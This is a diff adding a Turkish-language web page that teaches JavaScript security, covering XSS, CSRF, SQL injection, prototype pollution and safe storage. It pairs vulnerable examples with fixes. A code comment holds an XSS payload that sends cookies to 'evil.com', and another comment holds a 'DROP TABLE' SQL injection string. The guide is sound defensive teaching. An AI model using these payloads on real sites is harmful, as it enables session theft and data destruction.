@@ -1,0 +1,274 @@
+<h2>JavaScript Güvenlik: XSS, CSRF ve Korunma</h2>
+
+<p>Web uygulamaları, çeşitli güvenlik tehditlerine karşı savunmasız olabilir. Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), injection saldırıları ve veri sızıntıları en yaygın tehditler arasındadır. Bu rehberde JavaScript uygulamalarındaki güvenlik açıklarını, saldırı vektörlerini ve korunma yöntemlerini detaylı şekilde inceleyeceğiz.</p>
+
+<h3>XSS (Cross-Site Scripting)</h3>
+
+<p>XSS, saldırganın kötü niyetli JavaScript kodunu web sayfasına enjekte etmesidir. Üç ana türü vardır:</p>
+
+<h4>1. Stored XSS (Kalıcı)</h4>
+
+<pre><code>// Kötü: Kullanıcı girdisi doğrudan HTML'e ekleniyor
+const comment = getUserComment(); // "&lt;script&gt;document.location='https://evil.com?cookie='+document.cookie&lt;/script&gt;"
+element.innerHTML = comment; // XSS! Script çalışır
+
+// İyi: Metin olarak ekle
+element.textContent = comment; // Güvenli, HTML olarak yorumlanmaz
+
+// İyi: HTML encode et
+function escapeHtml(str) {
+  const div = document.createElement('div');
+  div.textContent = str;
+  return div.innerHTML;
+}
+
+element.innerHTML = escapeHtml(comment);</code></pre>
+
+<h4>2. Reflected XSS</h4>
+
+<pre><code>// Kötü: URL parametresini doğrudan kullanma
+// URL: https://site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+const query = new URLSearchParams(window.location.search).get('q');
+document.getElementById('results').innerHTML = `Sonuçlar: ${query}`; // XSS!
+
+// İyi: Sanitize et
+document.getElementById('results').textContent = `Sonuçlar: ${query}`;</code></pre>
+
+<h4>3. DOM-based XSS</h4>
+
+<pre><code>// Kötü: Güvenilmeyen kaynaktan gelen veriyi tehlikeli sink'lerde kullanma
+const hash = location.hash.substring(1);
+document.getElementById('content').innerHTML = hash; // XSS!
+
+// Kötü: eval kullanımı
+const userInput = getInput();
+eval(userInput); // Asla eval kullanmayın!
+
+// Kötü: Dinamik script oluşturma
+const script = document.createElement('script');
+script.textContent = userInput; // Tehlikeli!
+
+// İyi: Güvenli alternatifler
+document.getElementById('content').textContent = hash;
+const data = JSON.parse(userInput); // eval yerine JSON.parse</code></pre>
+
+<div class="warning">
+  <strong>Uyarı:</strong> <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout(string)</code> ve <code>new Function(string)</code> XSS'e açık tehlikeli sink'lerdir. Bu API'leri kullanıcı girdisiyle asla kullanmayın.
+</div>
+
+<h3>XSS Korunma Yöntemleri</h3>
+
+<pre><code>// 1. DOMPurify ile HTML sanitizasyonu
+import DOMPurify from 'dompurify';
+
+const dirtyHtml = userInput; // Güvenilmeyen HTML
+const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
+  ALLOWED_ATTR: ['href', 'title'],
+});
+element.innerHTML = cleanHtml;
+
+// 2. Template literal ile güvenli HTML
+function html(strings, ...values) {
+  return strings.reduce((result, string, i) =&gt; {
+    const value = values[i - 1];
+    const escaped = typeof value === 'string' ? escapeHtml(value) : value;
+    return result + escaped + string;
+  });
+}
+
+const userName = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
+element.innerHTML = html`&lt;p&gt;Hoşgeldin, ${userName}&lt;/p&gt;`;
+// Output: &lt;p&gt;Hoşgeldin, &amp;lt;script&amp;gt;alert("XSS")&amp;lt;/script&amp;gt;&lt;/p&gt;
+
+// 3. Trusted Types API (CSP ile birlikte)
+if (window.trustedTypes) {
+  const policy = trustedTypes.createPolicy('default', {
+    createHTML: (input) =&gt; DOMPurify.sanitize(input),
+    createScriptURL: (input) =&gt; {
+      const url = new URL(input, location.origin);
+      if (url.origin !== location.origin) throw new Error('Güvenilmeyen URL');
+      return url.toString();
+    },
+  });
+}</code></pre>
+
+<h3>CSRF (Cross-Site Request Forgery)</h3>
+
+<p>CSRF, kullanıcının oturum bilgilerini kullanarak istenmeyen istekler gönderilmesidir:</p>
+
+<pre><code>// CSRF korunma: Token tabanlı
+// Sunucu tarafı (Next.js API route)
+import { randomBytes } from 'crypto';
+
+// Token oluştur
+function generateCSRFToken() {
+  return randomBytes(32).toString('hex');
+}
+
+// API route'da doğrulama
+export async function POST(request) {
+  const token = request.headers.get('X-CSRF-Token');
+  const sessionToken = getSessionCSRFToken(request);
+
+  if (!token || token !== sessionToken) {
+    return Response.json({ error: 'CSRF token geçersiz' }, { status: 403 });
+  }
+
+  // İşlemi devam ettir...
+}
+
+// İstemci tarafı: Her istekte token gönder
+async function secureFetch(url, options = {}) {
+  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
+
+  return fetch(url, {
+    ...options,
+    headers: {
+      ...options.headers,
+      'X-CSRF-Token': csrfToken,
+    },
+    credentials: 'same-origin',
+  });
+}</code></pre>
+
+<h4>SameSite Cookie Koruması</h4>
+
+<pre><code>// Sunucu tarafı cookie ayarı
+// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+
+// Next.js'te cookie ayarlama
+import { cookies } from 'next/headers';
+
+export async function POST() {
+  const cookieStore = await cookies();
+  cookieStore.set('session', sessionId, {
+    httpOnly: true,     // JavaScript erişimini engeller
+    secure: true,       // Sadece HTTPS
+    sameSite: 'strict', // Cross-site isteklerde gönderilmez
+    maxAge: 3600,       // 1 saat
+    path: '/',
+  });
+}</code></pre>
+
+<h3>Injection Saldırıları</h3>
+
+<pre><code>// SQL Injection - Kötü (parametreli sorgu kullanmamak)
+const query = `SELECT * FROM users WHERE email = '${userEmail}'`;
+// userEmail = "'; DROP TABLE users; --" olabilir!
+
+// Doğru: Parametreli sorgu (Prisma)
+const user = await prisma.user.findUnique({
+  where: { email: userEmail },
+});
+
+// Prototype Pollution koruması
+// Kötü: Derin merge kontrolsüz
+function unsafeMerge(target, source) {
+  for (const key in source) {
+    target[key] = source[key]; // __proto__ manipülasyonuna açık
+  }
+}
+
+// İyi: __proto__ ve constructor kontrolü
+function safeMerge(target, source) {
+  for (const key of Object.keys(source)) {
+    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+      continue; // Tehlikeli anahtarları atla
+    }
+    if (typeof source[key] === 'object' &amp;&amp; source[key] !== null) {
+      target[key] = safeMerge(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}</code></pre>
+
+<div class="info">
+  <strong>Bilgi:</strong> Prototype pollution, JavaScript nesnelerinin prototip zincirini manipüle ederek uygulama davranışını değiştiren bir saldırı türüdür. Kullanıcı girdisiyle nesne birleştirme yapıyorsanız özellikle dikkatli olun.
+</div>
+
+<h3>Güvenli Veri Saklama</h3>
+
+<pre><code>// localStorage'da hassas veri SAKLAMAYIN
+// Kötü
+localStorage.setItem('authToken', jwtToken); // XSS ile çalınabilir
+
+// İyi: HttpOnly cookie kullanın
+// Token sunucu tarafında HttpOnly cookie'de saklanır
+
+// Eğer client-side storage zorunluysa, şifreleyin
+async function encryptData(data, key) {
+  const iv = crypto.getRandomValues(new Uint8Array(12));
+  const encoded = new TextEncoder().encode(JSON.stringify(data));
+
+  const encrypted = await crypto.subtle.encrypt(
+    { name: 'AES-GCM', iv },
+    key,
+    encoded
+  );
+
+  return {
+    iv: Array.from(iv),
+    data: Array.from(new Uint8Array(encrypted)),
+  };
+}
+
+// Hassas verileri loglamayın
+console.log('Kullanıcı girişi:', { email, password: '***' }); // Şifreyi gizle</code></pre>
+
+<h3>Bağımlılık Güvenliği</h3>
+
+<pre><code># npm audit ile güvenlik taraması
+npm audit
+npm audit fix
+
+# Snyk ile detaylı tarama
+npx snyk test
+
+# Lockfile integrity kontrolü
+npm ci  # package-lock.json'a sadık kalır
+
+# GitHub Dependabot (otomatik güncelleme)
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    open-pull-requests-limit: 10</code></pre>
+
+<div class="tip">
+  <strong>İpucu:</strong> <code>npm audit</code> komutunu CI/CD pipeline'ınıza ekleyin ve kritik güvenlik açığı bulunduğunda build'in başarısız olmasını sağlayın.
+</div>
+
+<h3>Güvenlik Kontrol Listesi</h3>
+
+<ol>
+  <li>Kullanıcı girdisini her zaman sanitize/escape edin</li>
+  <li><code>innerHTML</code> yerine <code>textContent</code> tercih edin</li>
+  <li>CSP (Content Security Policy) başlıklarını yapılandırın</li>
+  <li>CSRF token'ları uygulayın</li>
+  <li>Cookie'leri <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> bayraklarıyla ayarlayın</li>
+  <li><code>eval()</code> ve <code>new Function()</code> kullanmayın</li>
+  <li>Bağımlılıkları düzenli olarak denetleyin</li>
+  <li>HTTPS zorunlu kılın</li>
+  <li>Hassas verileri localStorage'da saklamayın</li>
+  <li>Hata mesajlarında sistem bilgisi ifşa etmeyin</li>
+</ol>
+
+<h3>Sonuç</h3>
+
+<p>JavaScript güvenliği, kullanıcı girdisine güvenmemek ilkesiyle başlar. XSS'i önlemek için girdileri sanitize edin ve DOM API'lerini dikkatli kullanın, CSRF'ye karşı token ve SameSite cookie'ler uygulayın, injection saldırılarına karşı parametreli sorgular ve güvenli merge fonksiyonları kullanın. Güvenlik sürekli bir süreçtir; bağımlılıklarınızı düzenli denetleyin ve güncel tehditleri takip edin.</p>
+
+<h3>Kaynaklar</h3>
+
+<ul>
+  <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noopener noreferrer">OWASP - Cross-Site Scripting (XSS)</a></li>
+  <li><a href="https://owasp.org/www-community/attacks/csrf" target="_blank" rel="noopener noreferrer">OWASP - Cross-Site Request Forgery</a></li>
+  <li><a href="https://github.com/nicolo-ribaudo/dompurify" target="_blank" rel="noopener noreferrer">DOMPurify - XSS Sanitizer</a></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API" target="_blank" rel="noopener noreferrer">MDN - Trusted Types API</a></li>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">OWASP - DOM XSS Prevention Cheat Sheet</a></li>
+</ul>
